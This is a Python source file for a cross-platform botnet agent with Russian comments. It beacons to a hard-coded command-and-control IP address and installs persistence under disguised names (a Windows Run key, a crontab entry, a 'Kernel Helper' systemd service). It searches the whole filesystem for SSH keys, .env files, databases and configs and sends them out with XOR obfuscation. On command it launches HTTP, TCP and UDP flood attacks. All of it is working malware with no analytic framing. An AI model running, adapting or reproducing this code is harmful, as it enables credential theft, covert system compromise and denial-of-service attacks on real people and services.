#!/usr/bin/env python3
# AVZ-Aristo Agent v25.3 – кросс-платформенный, инкогнито (XOR+шум), сбор файлов

import os, sys, platform, subprocess, socket, ssl, time, json, base64, uuid, random, threading, re, ctypes, string, hashlib
from pathlib import Path

# ========== КОНФИГУРАЦИЯ ==========
C2_HOST = "80.249.146.202"
C2_PORT = 443
C2_FALLBACK_PORT = 80
TOKEN = "AVZ-ARISTO-SECRET-KEY-2025"
XOR_KEY = "R4G3M0D3"
AGENT_VERSION = "25.3-RAGE"
HEARTBEAT_INTERVAL = random.randint(20, 40)
INCOGNITO = True  # режим инкогнито: XOR-шифрование и шум
# ==================================

AGENT_ID = str(uuid.uuid4())
OS_NAME = platform.system()
HOSTNAME = socket.gethostname()
USER = os.environ.get("USER") or os.environ.get("USERNAME") or "unknown"

def get_cpu():
    try:
        if OS_NAME == "Windows":
            return platform.processor()
        else:
            with open("/proc/cpuinfo") as f:
                for line in f:
                    if "model name" in line:
                        return line.split(":")[1].strip()
    except:
        pass
    return "Unknown"

def get_ram_gb():
    try:
        if OS_NAME == "Windows":
            import psutil
            return round(psutil.virtual_memory().total / (1024**3), 1)
        else:
            with open("/proc/meminfo") as f:
                for line in f:
                    if "MemTotal" in line:
                        return round(int(line.split()[1]) / 1024**2, 1)
    except:
        pass
    return 0.0

CPU = get_cpu()
RAM_GB = get_ram_gb()

BASE_INFO = {
    "id": AGENT_ID,
    "hostname": HOSTNAME,
    "os": OS_NAME,
    "os_version": platform.release(),
    "cpu": CPU,
    "ram_gb": RAM_GB,
    "user": USER,
    "agent_version": AGENT_VERSION
}

# ========== XOR & NOISE ==========
def xor_crypt(data: bytes) -> bytes:
    key = XOR_KEY.encode()
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def add_noise(data: bytes) -> bytes:
    # Добавляем 2-8 случайных байт в начало и конец для запутывания
    noise_start = os.urandom(random.randint(2, 8))
    noise_end = os.urandom(random.randint(2, 8))
    return noise_start + data + noise_end

def remove_noise(data: bytes) -> bytes:
    # Наивное удаление: ищем JSON фигурные скобки, но проще: знаем, что шум фиксирован?
    # Для простоты: ищем '{' и обрезаем до последней '}'
    start = data.find(b'{')
    end = data.rfind(b'}')
    if start != -1 and end != -1:
        return data[start:end+1]
    return data

def encode_msg(msg: dict) -> bytes:
    plain = json.dumps(msg).encode()
    if INCOGNITO:
        return add_noise(xor_crypt(plain)) + b'\n'
    return plain + b'\n'

def decode_msg(raw: bytes) -> dict:
    # Try plain JSON first
    try:
        return json.loads(raw.decode())
    except:
        pass
    # Remove noise and XOR decrypt
    trimmed = remove_noise(raw)
    try:
        decrypted = xor_crypt(trimmed)
        return json.loads(decrypted.decode())
    except:
        return None

# ========== Persistence ==========
def install_persistence():
    if OS_NAME == "Windows":
        try:
            import winreg
            agent_path = sys.executable if sys.executable else os.path.abspath(__file__)
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.SetValueEx(regkey, "WindowsUpdateTask", 0, winreg.REG_SZ, f'"{agent_path}" --hidden')
        except Exception:
            pass
    else:
        agent_path = os.path.abspath(__file__)
        cron_cmd = f"@reboot /usr/bin/python3 {agent_path} --hidden >/dev/null 2>&1"
        subprocess.call(f'(crontab -l 2>/dev/null; echo "{cron_cmd}") | crontab -', shell=True)
        if os.geteuid() == 0:
            service = f"""[Unit]
Description=Kernel Helper Service
After=network.target
[Service]
Type=simple
ExecStart=/usr/bin/python3 {agent_path} --hidden
Restart=always
[Install]
WantedBy=multi-user.target"""
            try:
                with open("/etc/systemd/system/khelper.service", "w") as f:
                    f.write(service)
                subprocess.call("systemctl daemon-reload && systemctl enable khelper.service", shell=True)
            except:
                pass

# ========== Сбор файлов (DataGrabber) ==========
def grab_files(patterns=None, max_size_kb=500):
    """Поиск файлов по маскам и отправка на C2"""
    if patterns is None:
        patterns = ["*.conf", "*.ini", "*.log", "*.bak", "*.sql", "*.env", "id_rsa", "*.key"]
    results = []
    for pattern in patterns:
        for root, dirs, files in os.walk('/'):
            for file in files:
                if Path(file).match(pattern):
                    full_path = os.path.join(root, file)
                    try:
                        size = os.path.getsize(full_path)
                        if size > max_size_kb * 1024:
                            continue
                        with open(full_path, 'rb') as f:
                            content = base64.b64encode(f.read()).decode()
                        results.append({
                            'path': full_path,
                            'size': size,
                            'content_b64': content
                        })
                    except:
                        continue
    return results

def exfiltrate_files(sock, files):
    """Отправка файлов на C2 порциями"""
    for file in files:
        msg = {
            'type': 'grab_result',
            'token': TOKEN,
            'data': file
        }
        try:
            sock.sendall(encode_msg(msg))
            time.sleep(0.5)
        except:
            break

# ========== Атака ==========
def execute_attack(params, stop_flag):
    target = params.get('target')
    method = params.get('method')
    threads = params.get('threads', 100)
    for _ in range(threads):
        t = threading.Thread(target=flood_thread, args=(target, method, stop_flag), daemon=True)
        t.start()

def flood_thread(target, method, stop_flag):
    while not stop_flag.is_set():
        try:
            if method in ("GET", "CFB", "CFBUAM", "RAPID"):
                import urllib.request
                headers = {"User-Agent": random.choice(["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"])}
                req = urllib.request.Request(target, headers=headers)
                urllib.request.urlopen(req, timeout=5)
            elif method == "TCP":
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((target, 80))
                s.send(b"GET / HTTP/1.1\r\nHost: "+target.encode()+b"\r\n\r\n")
                s.close()
            elif method == "UDP":
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(b"\xff"*1024, (target, 80))
                s.close()
        except:
            pass

# ========== Сетевое взаимодействие с C2 ==========
def connect_c2():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    try:
        # Пытаемся TLS
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        tls_sock = context.wrap_socket(sock, server_hostname=C2_HOST)
        tls_sock.connect((C2_HOST, C2_PORT))
        return tls_sock
    except:
        sock.close()
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((C2_HOST, C2_FALLBACK_PORT))
        return sock

def recv_line(sock):
    buffer = b""
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            break
        buffer += chunk
        while b"\n" in buffer:
            line, buffer = buffer.split(b"\n", 1)
            yield line
    if buffer:
        yield buffer

def main_loop():
    install_persistence()
    while True:
        try:
            sock = connect_c2()
            # Register
            reg_msg = {'type': 'register', 'token': TOKEN, 'data': BASE_INFO}
            sock.sendall(encode_msg(reg_msg))
            # Receive response
            resp = None
            for line in recv_line(sock):
                msg = decode_msg(line)
                if msg and msg.get('status') == 'ok':
                    break
            # Heartbeat & command loop
            last_heartbeat = time.time()
            stop_attack_flag = None
            while True:
                # Send heartbeat with jitter
                if time.time() - last_heartbeat > HEARTBEAT_INTERVAL:
                    ping = {'type': 'ping', 'token': TOKEN}
                    sock.sendall(encode_msg(ping))
                    last_heartbeat = time.time()
                # Check for commands
                sock.settimeout(1)
                try:
                    for line in recv_line(sock):
                        msg = decode_msg(line)
                        if not msg:
                            continue
                        cmd_type = msg.get('type')
                        if cmd_type == 'attack':
                            if stop_attack_flag:
                                stop_attack_flag.set()
                            stop_attack_flag = threading.Event()
                            execute_attack(msg['params'], stop_attack_flag)
                        elif cmd_type == 'stop':
                            if stop_attack_flag:
                                stop_attack_flag.set()
                        elif cmd_type == 'grab':
                            patterns = msg.get('params', {}).get('patterns')
                            files = grab_files(patterns)
                            exfiltrate_files(sock, files)
                except socket.timeout:
                    pass
        except Exception as e:
            time.sleep(random.randint(10, 30))

if __name__ == '__main__':
    if '--hidden' not in sys.argv:
        # Скрытый рестарт
        args = [sys.executable] + sys.argv + ['--hidden']
        if OS_NAME == "Windows":
            subprocess.Popen(args, creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
        sys.exit(0)
    main_loop()
